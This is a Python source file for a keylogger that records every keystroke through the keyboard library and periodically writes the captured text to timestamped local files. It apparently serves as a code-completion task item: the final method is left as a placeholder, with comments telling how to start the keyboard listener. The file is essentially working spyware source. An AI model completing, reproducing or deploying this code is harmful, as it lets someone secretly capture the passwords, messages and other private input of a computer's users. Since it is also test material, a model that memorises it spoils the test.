import keyboard
from threading import Timer
from datetime import datetime



class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "

            elif name == "enter":
                name = "\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            #print(self.log, file=f)
            f.write(self.log)


    def report(self):
 
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def Hellmary(self):
        # Activate the method of keyboard listening and recording, which sets a callback function for keyboard release events and starts recording keyboard events. 
        # Finally, use keyboard.wait() to keep the program running until the user chooses to exit.
        <FILL_HERE>